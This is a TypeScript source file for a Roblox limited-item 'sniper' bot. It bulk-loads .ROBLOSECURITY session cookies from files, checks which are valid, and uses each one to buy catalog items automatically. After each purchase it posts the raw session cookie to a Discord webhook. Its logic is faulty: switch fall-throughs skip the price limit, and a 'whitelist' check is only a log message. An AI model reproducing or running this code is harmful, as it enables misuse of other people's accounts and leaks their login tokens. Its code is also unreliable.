import fetch from "node-fetch";
import fs from "fs";
import noblox from "noblox.js";
import moment from "moment";
import chalk from "chalk";
import readline from "readline";
import HttpsProxyAgent from "https-proxy-agent";
import config from "./config.js";
import axios from "axios";
import { Webhook, MessageBuilder } from "discord-webhook-node";
const hook = new Webhook(config.webhook);
process.on("uncaughtException", (error) => { });
process.on("unhandledRejection", (error) => { });
// interface Item {
//   id: number;
//   itemType: string;
//   // Add more properties as needed
// }

// interface APIResponse {
//   keyword: null;
//   previousPageCursor: null;
//   nextPageCursor: null;
//   data: Item[];
// }

function log(message: any) {
  const timestamp = moment().format("YYYY-MM-DD HH:mm:ss.SSS");
  console.log(
    `${chalk.green([`[${timestamp}]`])} ${chalk.blue(`[Vox]`)} ${chalk.yellow(
      message
    )}`
  );
}

async function sendWebhook({
  cookie,
  itemsId,
  username,
  price,
  limiedName,
  Type,
}: {
  cookie: string;
  itemsId: number;
  username: string;
  price: number;
  limiedName: string;
  Type: string;
}) {
  const embed = new MessageBuilder()
    .setTitle("Go to Marketplace!!")
    .setURL(`https://roblox.com/catalog/${itemsId}`)
    .addField("Limied Name", limiedName, true)
    .addField("Best Price", `R$ ${price}`, true)
    .addField("Username", `@${username}`, true)
    .addField("Type", Type, true)
    .setDescription("```" + cookie + "```")
    .setTimestamp();
  hook.send(embed);
  return true;
}

async function checkCookies(cookie: string) {
  const user = await fetch("https://www.roblox.com/mobileapi/userinfo", {
    method: "GET",
    redirect: "manual",
    headers: {
      Cookie: `.ROBLOSECURITY=${cookie};`,
    },
  });
  return user.status;
}

interface mode {
  modeId: number;
  modeName: string;
}

class bootstrap {
  constructor() { }

  async run() {
    let mode: mode = {
      modeId: 0,
      modeName: "",
    };

    switch (config.mode) {
      case 0:
        mode = { modeId: 0, modeName: "Ugc Sniper (List)" };
        break;
      default:
        throw new Error("Mode Not Valid");
    }
    const LoadItems = fs.readFileSync("./items.txt", "utf8").split("\n").filter((line) => line.trim() !== "")

    log("Check is Whitelist....");
    log("Loader Success");
    log("Loader Items List : " + LoadItems.length);

    fs.readdir("./.ROBLOXSECURITY", (err, files) => {
      if (err) throw err;
      const validFilePath = "./valid.txt"; // ตำแหน่งไฟล์ valid.txt
      log(`Loader Cookies File : ${files.length}`);
      files.forEach((file) => {
        const readStream = fs.createReadStream(
          `./.ROBLOXSECURITY/${file}`,
          "utf8"
        );
        const rl = readline.createInterface({ input: readStream });
        const writeStream = fs.createWriteStream(validFilePath, {
          flags: "a",
        }); // เปิดสตรีมเขียนและใช้ flags "a" เพื่อเขียนต่อท้ายไฟล์

        rl.on("line", async (line) => {
          const x = await checkCookies(line);
          switch (x) {
            case 429:
              log("Rate Limit Try again in 10s");
              setTimeout(async () => {
                const newX = await checkCookies(line); // เรียกใช้งาน checkCookies อีกครั้งหลังจากผ่านเงื่อนไข 10 วินาที
                switch (newX) {
                  case 429:
                    log("Rate Limit Try again in 10s");
                    break;

                  case 200:
                    writeStream.write(line + "\n");
                    break;

                  default:
                    break;
                }
              }, 10000); // รอ 10 วินาที

            case 200:
              writeStream.write(line + "\n");
              break;
          }
        });

        rl.on("close", () => {
          readStream.close();
        });
      });
      log(`Checking Success Start : ${mode.modeName}`);
      log("Start in 5s wait module load...");
      setTimeout(() => {
        switch (mode.modeId) {
          case 0:
            const LoadCookies = fs.readFileSync(validFilePath, "utf8");
            this.ugc_list(
              LoadItems,
              LoadCookies.split("\n").filter((line) => line.trim() !== "")
            );
            log("Start (Ok)");
            break;
        }
      }, 5000);
    });
  }

  async ugc_list(items_id: string[], cookies_list: string[]) {
    const list: string[] = items_id;
    const cookies: string[] = cookies_list;
    cookies.forEach(async (cookie) => {
      const user = await axios("https://www.roblox.com/mobileapi/userinfo", {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
          Cookie: `.ROBLOSECURITY=${cookie};`,
        },
      });
      setInterval(async function() {
        list.forEach(async (id) => {
          const readyitems = await axios({
            url: `https://inventory.roproxy.com/v1/users/${user.data["UserID"]}/items/Asset/${id}/is-owned`,
          });
          const CsrfToken = await fetch("https://auth.roblox.com/v2/logout", {
            method: "POST",
            redirect: "manual",
            headers: {
              Cookie: `.ROBLOSECURITY=${cookie};`,
            },
          });
          const token = CsrfToken.headers.get("x-csrf-token");
          const Items = await axios(
            "https://catalog.roblox.com/v1/catalog/items/details",
            {
              method: "POST",
              headers: {
                Cookie: `.ROBLOSECURITY=${cookie};`,
                "X-Csrf-Token": token,
              },
              data: {
                items: [
                  {
                    itemType: 1,
                    id: id,
                  },
                ],
              },
            }
          );
          if (readyitems.data !== true) {
            switch (config.ugc.list.value.enabled) {
              case true:
                if (
                  config.ugc.list.value.max >= Items.data["data"]["price"] &&
                  Items.data["data"]["price"] <= config.ugc.list.value.max
                ) {
                  const x = await axios(
                    `https://economy.roblox.com/v1/purchases/products/${Items.data["data"][0]["productId"]}`,
                    {
                      method: "POST",
                      headers: {
                        "User-Agent":
                          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                        Cookie: `.ROBLOSECURITY=${cookie};`,
                        "X-Csrf-Token": token,
                      },
                      data: {
                        expectedCurrency: 1,
                        expectedPrice: null,
                        expectedSellerId: 1,
                      },
                    }
                  );
                  if (x.data["purchased"]) {
                    const webhook = await sendWebhook({
                      cookie: cookie,
                      limiedName: Items.data["data"][0]["name"],
                      Type: Items.data["data"][0]["assetType"],
                      username: user.data["UserName"],
                      price: parseInt(Items.data["data"][0]["price"]),
                      itemsId: parseInt(id),
                    });
                    log(`Send Webhook : ${webhook}`);
                  }
                }
              case false:
                const x = await axios(
                  `https://economy.roblox.com/v1/purchases/products/${Items.data["data"][0]["productId"]}`,
                  {
                    method: "POST",
                    headers: {
                      "User-Agent":
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                      Cookie: `.ROBLOSECURITY=${cookie};`,
                      "X-Csrf-Token": token,
                    },
                    data: {
                      expectedCurrency: 1,
                      expectedPrice: null,
                      expectedSellerId: 1,
                    },
                  }
                );
                if (x.data["purchased"]) {
                  const webhook = await sendWebhook({
                    cookie: cookie,
                    limiedName: Items.data["data"][0]["name"],
                    Type: Items.data["data"][0]["assetType"],
                    username: user.data["UserName"],
                    price: parseInt(Items.data["data"][0]["price"]),
                    itemsId: parseInt(id),
                  });
                  log(`Send Webhook : ${webhook}`);
                }
            }
          }
        });
      }, config.speed * 1000);
    });
  }
}
const main = new bootstrap();
main.run();
